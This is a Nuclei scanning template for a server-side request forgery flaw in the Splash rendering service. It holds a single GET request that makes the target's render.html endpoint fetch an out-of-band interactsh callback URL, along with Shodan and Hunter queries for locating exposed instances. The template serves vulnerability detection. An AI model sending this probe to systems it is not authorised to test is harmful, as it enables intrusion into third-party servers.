id: splash-render-ssrf

info:
  name: "Splash Render 组件 SSRF 漏洞"
  author: pwnhxl
  severity: high
  reference:
    - https://github.com/scrapinghub/splash
    - https://b1ngz.github.io/splash-ssrf-to-get-server-root-privilege/
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"Splash"
    hunter-query: web.title="Splash" && header="TwistedWeb"
  tags: Splash

http:
  - method: GET
    path:
      - "{{BaseURL}}/render.html?url={{interactsh-url}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'dns'

      - type: status
        status:
          - 200

